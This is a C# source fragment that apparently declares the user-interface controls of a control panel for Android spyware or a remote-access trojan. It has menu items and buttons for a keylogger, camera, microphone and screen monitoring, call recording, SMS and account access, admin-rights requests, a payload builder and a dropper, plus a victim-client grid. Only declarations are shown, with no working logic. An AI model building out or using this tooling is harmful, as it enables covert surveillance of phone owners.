	[AccessedThroughProperty("ToolStripMenuItem12")]
	private ToolStripMenuItem _ToolStripMenuItem12;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ScreenMonitorToolStripMenuItem")]
	private ToolStripMenuItem _ScreenMonitorToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ScreenReaderToolStripMenuItem")]
	private ToolStripMenuItem _ScreenReaderToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CameraMonitorToolStripMenuItem")]
	private ToolStripMenuItem _CameraMonitorToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("MicrophoneMonitorToolStripMenuItem")]
	private ToolStripMenuItem _MicrophoneMonitorToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("KeyloggerToolStripMenuItem1")]
	private ToolStripMenuItem _KeyloggerToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("LiveModeToolStripMenuItem1")]
	private ToolStripMenuItem _LiveModeToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SilentModeGOIPToolStripMenuItem")]
	private ToolStripMenuItem _SilentModeGOIPToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("WebBrowserToolStripMenuItem1")]
	private ToolStripMenuItem _WebBrowserToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CallRecorderToolStripMenuItem")]
	private ToolStripMenuItem _CallRecorderToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem3")]
	private ToolStripMenuItem _ToolStripMenuItem3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("RequestAdminRightsToolStripMenuItem")]
	private ToolStripMenuItem _RequestAdminRightsToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("LockScreenToolStripMenuItem")]
	private ToolStripMenuItem _LockScreenToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem2")]
	private ToolStripMenuItem _ToolStripMenuItem2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem5")]
	private ToolStripMenuItem _ToolStripMenuItem5;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem6")]
	private ToolStripMenuItem _ToolStripMenuItem6;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem7")]
	private ToolStripMenuItem _ToolStripMenuItem7;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem8")]
	private ToolStripMenuItem _ToolStripMenuItem8;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem9")]
	private ToolStripMenuItem _ToolStripMenuItem9;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem10")]
	private ToolStripMenuItem _ToolStripMenuItem10;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("NotificationListnerToolStripMenuItem")]
	private ToolStripMenuItem _NotificationListnerToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CallsListnerToolStripMenuItem")]
	private ToolStripMenuItem _CallsListnerToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PhoneInformationToolStripMenuItem")]
	private ToolStripMenuItem _PhoneInformationToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem16")]
	private ToolStripMenuItem _ToolStripMenuItem16;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem17")]
	private ToolStripMenuItem _ToolStripMenuItem17;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem18")]
	private ToolStripMenuItem _ToolStripMenuItem18;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem11")]
	private ToolStripMenuItem _ToolStripMenuItem11;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("KeyboardToolStripMenuItem")]
	private ToolStripMenuItem _KeyboardToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ClientFolderToolStripMenuItem")]
	private ToolStripMenuItem _ClientFolderToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ClientsWindow")]
	private DrakeUIDataGridView _ClientsWindow;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon3")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon4")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon4;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon6")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon6;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon5")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon5;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Clients_Btn")]
	private DrakeUIButtonIcon _Clients_Btn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("blockbtn")]
	private DrakeUIButtonIcon _blockbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Connection_btn")]
	private DrakeUIButtonIcon _Connection_btn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar1")]
	private DrakeUIAvatar _DrakeUIAvatar1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem14")]
	private ToolStripMenuItem _ToolStripMenuItem14;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkupdate")]
	private System.Windows.Forms.Timer _checkupdate;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mapworker")]
	private BackgroundWorker _mapworker;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Statustimer")]
	private System.Windows.Forms.Timer _Statustimer;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("addpo")]
	private DrakeUIAvatar _addpo;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("bigtitletext")]
	private Label _bigtitletext;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("studiobtn")]
	private DrakeUIButtonIcon _studiobtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("notifiaisbtntop")]
	private DrakeUIButtonIcon _notifiaisbtntop;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon11")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon11;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon10")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon10;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon7")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon7;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("serversbtn")]
	private DrakeUIButtonIcon _serversbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("porttext")]
	private DrakeUITextBox _porttext;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar2")]
	private DrakeUIAvatar _DrakeUIAvatar2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("rempo")]
	private DrakeUIAvatar _rempo;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DGVSERVS")]
	private DataGridView _DGVSERVS;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar4")]
	private DrakeUIAvatar _DrakeUIAvatar4;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar9")]
	private DrakeUIAvatar _DrakeUIAvatar9;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar8")]
	private DrakeUIAvatar _DrakeUIAvatar8;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar5")]
	private DrakeUIAvatar _DrakeUIAvatar5;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("AllowAppToolStripMenuItem")]
	private ToolStripMenuItem _AllowAppToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem15")]
	private ToolStripMenuItem _ToolStripMenuItem15;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon14")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon14;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon17")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon17;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon18")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon18;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon19")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon19;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar11")]
	private DrakeUIAvatar _DrakeUIAvatar11;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon16")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon16;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem19")]
	private ToolStripMenuItem _ToolStripMenuItem19;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem21")]
	private ToolStripMenuItem _ToolStripMenuItem21;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem22")]
	private ToolStripMenuItem _ToolStripMenuItem22;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem20")]
	private ToolStripMenuItem _ToolStripMenuItem20;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon20")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon20;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem24")]
	private ToolStripMenuItem _ToolStripMenuItem24;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem23")]
	private ToolStripMenuItem _ToolStripMenuItem23;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem25")]
	private ToolStripMenuItem _ToolStripMenuItem25;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("droperbtn")]
	private DrakeUIButtonIcon _droperbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("monitortimer")]
	private System.Windows.Forms.Timer _monitortimer;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("UsdtToolStripMenuItem")]
	private ToolStripMenuItem _UsdtToolStripMenuItem;

	internal NotifyIcon notfi

		;

	internal System.Windows.Forms.Timer TOpacity
;

	[field: AccessedThroughProperty("ToolTip1")]
	internal ToolTip ToolTip1
	;

	[field: AccessedThroughProperty("notifiform")]
	internal DrakeUIToolTip notifiform
	;
	[field: AccessedThroughProperty("ctxconnection")]
	internal DrakeUIContextMenuStrip ctxconnection
;

	internal ToolStripMenuItem BlockClientToolStripMenuItem
;

	[field: AccessedThroughProperty("blockctx")]
	internal DrakeUIContextMenuStrip blockctx
;

	internal ToolStripMenuItem ToolStripMenuItem1
	;


	[field: AccessedThroughProperty("ToolTips")]
	internal DrakeUIToolTip ToolTips
;








	[field: AccessedThroughProperty("ctxmenu")]
	internal DrakeUIContextMenuStrip ctxmenu
;

	[field: AccessedThroughProperty("ManagersToolStripMenuItem")]
	internal ToolStripMenuItem ManagersToolStripMenuItem
;

	internal ToolStripMenuItem FilesToolStripMenuItem
;

	internal ToolStripMenuItem SMSToolStripMenuItem
;

	internal ToolStripMenuItem CallsToolStripMenuItem1
	;

	internal ToolStripMenuItem ContactsToolStripMenuItem
	;

	internal ToolStripMenuItem AccountsToolStripMenuItem
	;

	internal ToolStripMenuItem ApplicationsToolStripMenuItem
;

	internal ToolStripMenuItem ToolStripMenuItem12
;


	[field: AccessedThroughProperty("ToolStripSeparator1")]
	internal ToolStripSeparator ToolStripSeparator1
;

	[field: AccessedThroughProperty("MonitorsToolStripMenuItem")]
	internal ToolStripMenuItem MonitorsToolStripMenuItem
;

	internal ToolStripMenuItem ScreenMonitorToolStripMenuItem
;

	internal ToolStripMenuItem ScreenReaderToolStripMenuItem
	;

	internal ToolStripMenuItem CameraMonitorToolStripMenuItem
	;

	internal ToolStripMenuItem MicrophoneMonitorToolStripMenuItem
;

	internal ToolStripMenuItem KeyloggerToolStripMenuItem1
;

	[field: AccessedThroughProperty("LocationsMonitorToolStripMenuItem")]
	internal ToolStripMenuItem LocationsMonitorToolStripMenuItem
	;

	internal ToolStripMenuItem LiveModeToolStripMenuItem1
;

	[field: AccessedThroughProperty("ToolStripSeparator2")]
	internal ToolStripSeparator ToolStripSeparator2
	;

	internal ToolStripMenuItem SilentModeGOIPToolStripMenuItem
;

	internal ToolStripMenuItem WebBrowserToolStripMenuItem1
;

	internal ToolStripMenuItem CallRecorderToolStripMenuItem
	;


	internal ToolStripMenuItem ToolStripMenuItem3
;

	[field: AccessedThroughProperty("ToolStripSeparator3")]
	internal ToolStripSeparator ToolStripSeparator3
	;

	[field: AccessedThroughProperty("AdminToolStripMenuItem")]
	internal ToolStripMenuItem AdminToolStripMenuItem
	;

	internal ToolStripMenuItem RequestAdminRightsToolStripMenuItem
;

	internal ToolStripMenuItem LockScreenToolStripMenuItem
;

	[field: AccessedThroughProperty("ToolStripSeparator6")]
	internal ToolStripSeparator ToolStripSeparator6
;

	[field: AccessedThroughProperty("ToolStripMenuItem4")]
	internal ToolStripMenuItem ToolStripMenuItem4
		;

	internal ToolStripMenuItem ToolStripMenuItem5
	 ;

	internal ToolStripMenuItem ToolStripMenuItem6
;

	internal ToolStripMenuItem ToolStripMenuItem7
;

	internal ToolStripMenuItem ToolStripMenuItem8
;

	internal ToolStripMenuItem ToolStripMenuItem9
	;




	internal ToolStripMenuItem ToolStripMenuItem10
;

	[field: AccessedThroughProperty("ToolStripSeparator5")]
	internal ToolStripSeparator ToolStripSeparator5
;


	[field: AccessedThroughProperty("ExtraToolStripMenuItem")]
	internal ToolStripMenuItem ExtraToolStripMenuItem
;


	internal ToolStripMenuItem NotificationListnerToolStripMenuItem
	;

	internal ToolStripMenuItem CallsListnerToolStripMenuItem
;


	internal ToolStripMenuItem PhoneInformationToolStripMenuItem
;

	[field: AccessedThroughProperty("ToolStripSeparator7")]
	internal ToolStripSeparator ToolStripSeparator7
	;


	[field: AccessedThroughProperty("ToolStripMenuItem13")]
	internal ToolStripMenuItem ToolStripMenuItem13
	;


	internal ToolStripMenuItem ToolStripMenuItem16
	;

	internal ToolStripMenuItem ToolStripMenuItem17
	;

	internal ToolStripMenuItem ToolStripMenuItem18
	;

	internal ToolStripMenuItem ToolStripMenuItem11
	;

	[field: AccessedThroughProperty("ToolStripSeparator8")]
	internal ToolStripSeparator ToolStripSeparator8
	;

	internal ToolStripMenuItem KeyboardToolStripMenuItem
;

	[field: AccessedThroughProperty("ToolStripSeparator4")]
	internal ToolStripSeparator ToolStripSeparator4
	;

	internal ToolStripMenuItem ClientFolderToolStripMenuItem
;

	internal ToolStripMenuItem ToolStripMenuItem14
	;

	internal System.Windows.Forms.Timer checkupdate
	;

	internal BackgroundWorker mapworker
	;

	internal System.Windows.Forms.Timer Statustimer
	;

	[field: AccessedThroughProperty("ImageList1")]
	internal ImageList ImageList1
	;


	[field: AccessedThroughProperty("FWctx")]
	internal DrakeUIContextMenuStrip FWctx
	;

	internal ToolStripMenuItem AllowAppToolStripMenuItem
;

	internal ToolStripMenuItem ToolStripMenuItem15
;

	[field: AccessedThroughProperty("TRKctx")]
	internal DrakeUIContextMenuStrip TRKctx
	;

	internal ToolStripMenuItem ToolStripMenuItem19
	;

	internal ToolStripMenuItem ToolStripMenuItem21
	;

	internal ToolStripMenuItem ToolStripMenuItem22
;

	internal ToolStripMenuItem ToolStripMenuItem20
	;

	internal ToolStripMenuItem ToolStripMenuItem24
	;
	internal ToolStripMenuItem ToolStripMenuItem23
	;

	internal ToolStripMenuItem ToolStripMenuItem25
;

	internal System.Windows.Forms.Timer monitortimer
	;
    private Guna.UI2.WinForms.Guna2AnimateWindow guna2AnimateWindow1;
    private DataGridViewImageColumn dataGridViewImageColumn5;
    private Guna.UI2.WinForms.Guna2BorderlessForm guna2BorderlessForm1;
    internal Panel Mainpanel;
    private Guna.UI2.WinForms.Guna2Panel guna2Panel4;
    internal DrakeUIButtonIcon drakeUIButtonIcon26;
    internal DrakeUIButtonIcon drakeUIButtonIcon1;
    internal DrakeUIButtonIcon drakeUIButtonIcon2;
    internal DrakeUIButtonIcon drakeUIButtonIcon12;
    internal DrakeUIButtonIcon drakeUIButtonIcon13;
    internal DrakeUIButtonIcon drakeUIButtonIcon21;
    internal DrakeUIButtonIcon drakeUIButtonIcon18;
    internal DrakeUIButtonIcon drakeUIButtonIcon27;
    internal DrakeUIButtonIcon drakeUIButtonIcon25;
    internal DrakeUIButtonIcon drakeUIButtonIcon24;
    internal DrakeUIButtonIcon drakeUIButtonIcon23;
    internal DrakeUIButtonIcon drakeUIButtonIcon22;
    internal DrakeUIButtonIcon drakeUIButtonIcon33;
    internal DrakeUIButtonIcon drakeUIButtonIcon17;
    internal DrakeUIButtonIcon drakeUIButtonIcon31;
    internal DrakeUIButtonIcon drakeUIButtonIcon30;
    internal DrakeUIButtonIcon drakeUIButtonIcon29;
    internal DrakeUIButtonIcon drakeUIButtonIcon28;
    internal DrakeUIButtonIcon drakeUIButtonIcon4;
    internal DrakeUIButtonIcon drakeUIButtonIcon15;
    internal DrakeUIButtonIcon drakeUIButtonIcon34;
    internal DrakeUIButtonIcon drakeUIButtonIcon35;
    internal DrakeUIButtonIcon drakeUIButtonIcon36;
    internal DrakeUIButtonIcon drakeUIButtonIcon37;
    internal DrakeUIButtonIcon drakeUIButtonIcon38;
    private Guna.UI2.WinForms.Guna2Panel guna2Panel3;
    internal Guna.UI2.WinForms.Guna2GradientButton ClientsButton;
    internal Guna.UI2.WinForms.Guna2GradientButton Guna2GradientButton20;
    internal PictureBox PictureBox9;
    internal Guna.UI2.WinForms.Guna2GradientButton ClientsClearLogs;
    internal PictureBox pictureBox4;
    internal PictureBox pictureBox5;
    internal Guna.UI2.WinForms.Guna2GradientButton guna2GradientButton3;
    internal PictureBox pictureBox3;
    internal DrakeUIButtonIcon drakeUIButtonIcon3;
    internal Guna.UI2.WinForms.Guna2GradientButton Guna2GradientButton22;
    internal Guna.UI2.WinForms.Guna2GradientButton guna2GradientButton4;
    private DrakeUIMeter drakeUIMeter1;
    internal DrakeUIButtonIcon AlertButton;
    internal DrakeUITextBox toblocktext;
    internal Guna.UI2.WinForms.Guna2GradientButton ClientsLogs;
    private DrakeUITitleLine drakeUITitleLine1;
    internal DrakeUIDataGridView ClientsWindow;
    internal DrakeUICheckBox checkenablelogs;
    internal DrakeUICheckBox checkclearlogs;
    internal DataGridView DGVblocked;
    internal Label label16;
    private Guna.UI2.WinForms.Guna2Panel guna2Panel2;
    private Panel panel8;
    private Guna.UI2.WinForms.Guna2ShadowPanel guna2ShadowPanel4;
    private DrakeUILabel drakeUILabel3;
    private Guna.UI2.WinForms.Guna2ShadowPanel guna2ShadowPanel3;
    internal Label label1;
    internal Label label9;
    private Guna.UI2.WinForms.Guna2ShadowPanel guna2ShadowPanel2;
    internal Label label8;
    internal Label label2;
    private Guna.UI2.WinForms.Guna2ShadowPanel guna2ShadowPanel1;
    internal Label label7;
    internal Label label6;
    private DrakeUILabel drakeUILabel1;
    private DrakeUILabel drakeUILabel4;
    internal Label bigtitletext;
    internal DrakeUITitlePanel connectionpanel;
    internal DrakeUITitlePanel blockpanel;
    internal Panel notificationspanel;
    internal DrakeUITitlePanel callspanel;
    internal DataGridView DGVCALLS;
    internal DataGridViewImageColumn DataGridViewImageColumn3;
    internal DataGridViewTextBoxColumn DataGridViewTextBoxColumn2;
    internal DrakeUITitlePanel activityzpanel;
    internal DataGridView DGVNOTF;
    internal DataGridViewImageColumn cliimg;
    internal DataGridViewTextBoxColumn notitext;
    internal Panel serverspanel;
    internal DrakeUITitlePanel DashboardPanel;
    internal Panel MonitorPanel;
    internal Panel Panel16;
    internal DrakeUIButtonIcon DrakeUIButtonIcon16;
    internal DrakeUIButtonIcon DrakeUIButtonIcon14;
    internal DrakeUIButtonIcon micbtn;
    internal DrakeUIButtonIcon screenreadbtn;
    internal DrakeUIButtonIcon locationbtn;
    internal DrakeUIButtonIcon DrakeUIButtonIcon6;
    internal Panel Panel20;
    internal Panel FWPANEL;
    internal DrakeUITitlePanel infotitlepanel;
    internal Panel infopanel;
    internal Panel Panel5;
    internal Panel MapPannel;
    internal DrakeUITitlePanel mappanel;
    internal Panel Panel2;
    internal DrakeUIGroupBox infobox;
    internal DrakeUILabel infotext;
    internal DrakeUIAvatar DrakeUIAvatar3;
    internal DrakeUIGroupBox ReciveBox;
    internal DrakeUILabel recvtotal;
    internal DrakeUIAvatar DrakeUIAvatar6;
    internal DrakeUIGroupBox SentBox;
    internal DrakeUILabel senttotal;
    internal DrakeUIAvatar DrakeUIAvatar7;
    internal DrakeUIGroupBox RecentBox;
    internal DrakeUILabel lastclienttext;
    internal DrakeUIAvatar lastclientpic;
    internal Label Label4;
    internal DrakeUIAvatar DrakeUIAvatar9;
    internal DrakeUIAvatar DrakeUIAvatar5;
    internal DrakeUIAvatar DrakeUIAvatar8;
    internal DrakeUIAvatar FWstatus;
    internal DataGridView DGFW;
    internal Panel TRKPANEL;
    internal DataGridView DGVTRK;
    internal Panel Panel17;
    internal Label Label5;
    internal DrakeUIComboBox combodatestrack;
    internal DrakeUIAvatar DrakeUIAvatar11;
    internal Panel recordsShowpanel;
    internal TextBox recordshowtext;
    internal DrakeUIButtonIcon DrakeUIButtonIcon20;
    internal DrakeUIButtonIcon applicationsbtn;
    internal DrakeUIButtonIcon keyloggerbtn;
    internal DrakeUIButtonIcon DrakeUIButtonIcon5;
    internal DrakeUIButtonIcon smsbtn;
    internal Panel Panel6;
    internal DrakeUIAvatar clearsrchbtn;
    internal DrakeUITextBox searchtext;
    internal DrakeUIAvatar searchbtn;
    internal Panel Panel18;
    internal DrakeUIAvatar DrakeUIAvatar1;
    internal PictureBox TCavatar;
    internal DrakeUIButtonIcon uncheckbtn;
    internal DrakeUIButtonIcon clientfoldrbtn;
    internal DrakeUIAvatar DrakeUIAvatar4;
    internal Panel Panel19;
    internal Panel Panel4;
    internal Panel Panel13;
    internal DrakeUITitlePanel notifispanel;
    internal DrakeUIButtonIcon DrakeUIButtonIcon8;
    internal Panel Panel7;
    internal DrakeUIButtonIcon DrakeUIButtonIcon9;
    internal DataGridView DGVALRTS;
    internal DataGridViewImageColumn DataGridViewImageColumn4;
    internal DataGridViewTextBoxColumn DataGridViewTextBoxColumn3;
    internal Panel Panel12;
    internal DrakeUIButtonIcon DrakeUIButtonIcon11;
    internal DrakeUIButtonIcon DrakeUIButtonIcon10;
    internal DrakeUIButtonIcon DrakeUIButtonIcon7;
    internal Panel Panel9;
    internal DrakeUIAvatar addpo;
    internal Label infolowtext;
    internal Panel Panel11;
    internal DrakeUITextBox passtxt;
    internal DrakeUIAvatar clearbtn;
    internal DrakeUICheckBox checksavepass;
    private DrakeUIButtonIcon rempo;
    private DrakeUIButtonIcon DrakeUIAvatar2;
    internal DrakeUITextBox porttext;
    internal DataGridView DataLog;
    internal DataGridViewImageColumn DataGridViewImageColumn2;
    internal DataGridViewTextBoxColumn DataGridViewTextBoxColumn5;
    internal DataGridViewTextBoxColumn DataGridViewTextBoxColumn4;
    internal DataGridViewTextBoxColumn DataGridViewTextBoxColumn7;
    internal DataGridViewTextBoxColumn dattim;
    internal Panel Panel3;
    internal DrakeUIButtonIcon Build_btn;
    internal DrakeUIButtonIcon inject_btn;
    private DrakeUILabel drakeUILabel5;
    internal DrakeUIButtonIcon Settings_btn;
    internal DrakeUIButtonIcon droperbtn;
    internal DrakeUIButtonIcon studiobtn;
    internal PictureBox pictureBox2;
    internal Label Label3;
    private Panel panel1;
    internal DrakeUIButtonIcon drakeUIButtonIcon39;
    internal DrakeUIButtonIcon drakeUIButtonIcon40;
    internal DrakeUIButtonIcon drakeUIButtonIcon42;
    internal DrakeUIButtonIcon drakeUIButtonIcon41;
    internal DrakeUIButtonIcon Home_Btn;
    internal DrakeUIButtonIcon notifiaisbtntop;
    internal DrakeUIButtonIcon Connection_btn;
    internal DrakeUIButtonIcon blockbtn;
    internal DrakeUIButtonIcon Clients_Btn;
    internal DrakeUIButtonIcon serversbtn;
    private Guna2Panel guna2Panel1;
    internal PictureBox pictureBox6;
    internal PictureBox pictureBox7;
    internal PictureBox pictureBox8;
    internal PictureBox pictureBox10;
    internal PictureBox pictureBox11;
    internal PictureBox pictureBox12;
    internal PictureBox pictureBox14;
    internal PictureBox pictureBox13;
    private Panel panel10;
    private Panel panel14;
    private Panel panel15;
    private PictureBox pictureBox15;
    private DataGridViewImageColumn cliscren;
    private DataGridViewImageColumn cliav;
    private DataGridViewImageColumn cliflg;
    private DataGridViewTextBoxColumn cliname;
    private DataGridViewTextBoxColumn clicountry;
    private DataGridViewTextBoxColumn cliip;
    private DataGridViewTextBoxColumn andver;
    private DataGridViewTextBoxColumn phondmod;
    private DataGridViewImageColumn clinoti;
    private DataGridViewImageColumn clicalls;
    private DataGridViewImageColumn clibtry;
    private DataGridViewImageColumn cliwifi;
    private DataGridViewTextBoxColumn cliavt;
    private DataGridViewTextBoxColumn defcli;
    private DataGridViewImageColumn isadmincli;
    private DataGridViewTextBoxColumn clipng;
    private DataGridViewTextBoxColumn instdate;
    private ToolStripMenuItem 隐藏图标ToolStripMenuItem;
